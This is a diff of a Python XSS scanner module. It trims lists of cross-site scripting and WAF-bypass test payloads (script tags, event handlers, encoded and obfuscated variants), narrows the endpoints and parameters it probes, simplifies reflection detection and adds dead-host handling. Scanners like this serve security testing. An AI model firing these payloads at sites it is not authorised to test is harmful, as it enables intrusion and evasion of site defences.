@@ -7,7 +7,7 @@ from typing import Dict, Any, Optional, List
 from urllib.parse import urljoin, quote, urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from helpers.http_client import HttpClient
+from helpers.http_client import HttpClient, HostDeadException
 from helpers.waf_checker import WAFChecker
 from helpers.spa_crawler import SPACrawler
 from helpers.parsers import (
@@ -51,50 +51,27 @@ XSS_MARKER = 'DEEPSCANXSS7x9z'
 XSS_PAYLOADS = [
     f'<script>alert("{XSS_MARKER}")</script>',
     f'"><script>alert("{XSS_MARKER}")</script>',
-    f"'><script>alert('{XSS_MARKER}')</script>",
     f'<img src=x onerror=alert("{XSS_MARKER}")>',
-    f'"><img src=x onerror=alert("{XSS_MARKER}")>',
     f'<svg onload=alert("{XSS_MARKER}")>',
-    f'<body onload=alert("{XSS_MARKER}")>',
     f'<ScRiPt>alert("{XSS_MARKER}")</ScRiPt>',
-    f'<img src=x onerror=alert`{XSS_MARKER}`>',
-    f'<svg/onload=alert("{XSS_MARKER}")>',
-    f'" onmouseover="alert(\'{XSS_MARKER}\')" x="',
-    f"' onmouseover='alert(\"{XSS_MARKER}\")' x='",
-    f'</script><script>alert("{XSS_MARKER}")</script>',
-    f'javascript:alert("{XSS_MARKER}")',
 ]
 
 WAF_BYPASS_PAYLOADS = [
     f'%3Cscript%3Ealert%28%22{XSS_MARKER}%22%29%3C%2Fscript%3E',
-    f'<scr%00ipt>alert("{XSS_MARKER}")</scr%00ipt>',
-    f'<img src=x onerror=&#97;lert("{XSS_MARKER}")>',
-    # Tambahan WAF bypass payloads
-    f'<svg/onload=alert("{XSS_MARKER}")>',
     f'<details/open/ontoggle=alert("{XSS_MARKER}")>',
-    f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("{XSS_MARKER}")>',
-    f'<img src=x onerror="eval(atob(\'YWxlcnQo\'))" />',
-    f'<iframe src="javascript:alert(`{XSS_MARKER}`)" />',
     f'<input onfocus=alert("{XSS_MARKER}") autofocus>',
-    f'<marquee onstart=alert("{XSS_MARKER}")>',
-    f'"><img/src=x onerror=alert("{XSS_MARKER}")>',
-    f'"><svg/onload=confirm("{XSS_MARKER}")>',
 ]
 
 TEST_ENDPOINTS = [
     '/search', '/q', '/find',
     '/comment', '/feedback', '/contact',
-    '/profile', '/user', '/users',
-    '/api/search', '/api/query', '/api/posts',
-    '/api/comments', '/api/feedback',
-    '/posts/search', '/',
+    '/api/search', '/',
 ]
 
 TEST_PARAMS = [
     'q', 'search', 'query', 'keyword', 's',
-    'name', 'message', 'comment', 'input',
-    'text', 'value', 'title', 'content',
-    'username', 'email', 'url', 'redirect',
+    'name', 'message', 'comment',
+    'url', 'redirect',
 ]
 
 
@@ -163,11 +140,11 @@ class XSSChecker:
         self._api_bases: List = []
 
         self._client = HttpClient(
-            timeout=self.timeout,
+            timeout=5,
             headers=HEADERS,
             cookies=self.cookies,
             verify=False,
-            retries=1,
+            retries=0,  # Tidak retry — jika timeout berarti di-tarpit oleh WAF
         )
 
     # ── Utils ─────────────────────────────────────────────────────────────────
@@ -188,26 +165,15 @@ class XSSChecker:
         if 'application/json' in content_type:
             return False
 
-        stripped = body.strip()
-        if stripped.startswith(('{', '[')):
-            json_pattern = re.compile(
-                r'["\']([^"\']*' + re.escape(XSS_MARKER) + r'[^"\']*)["\']'
-            )
-            if json_pattern.search(body):
-                return False
+        from urllib.parse import unquote
+        decoded_payload = unquote(payload).lower()
+        body_lower = body.lower()
+        
+        # Cek apakah payload asli (unencoded) benar-benar terefleksi di body
+        if decoded_payload in body_lower:
+            return True
 
-        encoded_variants = [
-            payload.replace('<', '&lt;').replace('>', '&gt;'),
-            payload.replace('"', '&quot;'),
-            '&lt;script&gt;',
-            '&amp;lt;',
-            quote(payload),
-        ]
-        for enc in encoded_variants:
-            if enc in body and payload not in body:
-                return False
-
-        return True
+        return False
 
     def _extract_api_bases(self, js_text: str):
         for api_url in re.findall(
@@ -236,6 +202,8 @@ class XSSChecker:
                 with self._lock:
                     if url not in active:
                         active.append(url)
+            except HostDeadException:
+                raise
             except Exception:
                 pass
 
@@ -246,6 +214,7 @@ class XSSChecker:
             ]
             for f in as_completed(futures):
                 try: f.result()
+                except HostDeadException: raise
                 except Exception: pass
 
         r_main = self._client.get(self.base_url, headers=HEADERS)
@@ -341,6 +310,8 @@ class XSSChecker:
                             self._vuln_found.set()
                         return
 
+                except HostDeadException:
+                    raise
                 except Exception:
                     pass
 
@@ -426,6 +397,8 @@ class XSSChecker:
                                 self._vuln_found.set()
                             break
 
+                    except HostDeadException:
+                        raise
                     except Exception:
                         pass
 
@@ -469,6 +442,10 @@ class XSSChecker:
                             remaining.cancel()
                         break
                     try: f.result()
+                    except HostDeadException:
+                        for remaining in futures:
+                            remaining.cancel()
+                        break
                     except Exception: pass
 
             _step(3, 3, "Form XSS scan ...")
